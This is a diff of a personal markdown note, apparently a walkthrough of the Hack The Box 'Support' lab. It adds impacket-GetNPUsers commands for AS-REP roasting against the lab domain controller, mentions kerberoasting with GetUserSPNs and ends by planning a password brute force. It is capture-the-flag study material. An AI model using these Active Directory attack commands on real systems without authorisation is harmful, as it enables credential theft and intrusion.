@@ -98,4 +98,15 @@ kerbrute_linux_amd64 userenum -d support.htb --dc 10.10.11.174 usernames
 >[!Example]- Result
 >![[Pasted image 20250224200619.png]]
 
-- When we are on a AD enviroment and we have valid username we can use 
+- When we are on a AD enviroment and we have valid username we can use [[impacket-GetNPUsers]] (To get a tgt) & [[impacket-GetUserSPNs]] (to perform a kerberoasting attack, we need valid credentials)
+```bash
+impacket-GetNPUsers support.htb/ldap -no-pass
+or
+impacket-GetNPUsers support.htb/ldap -no-pass -k
+```
+>[!Example]- Result
+>![[Pasted image 20250224204158.png]]
+>![[Pasted image 20250224204303.png]]
+
+
+- There are no user with this flag on "UF_DONT_REQUIRE_PREAUTH" so lets try brute forcing the pass
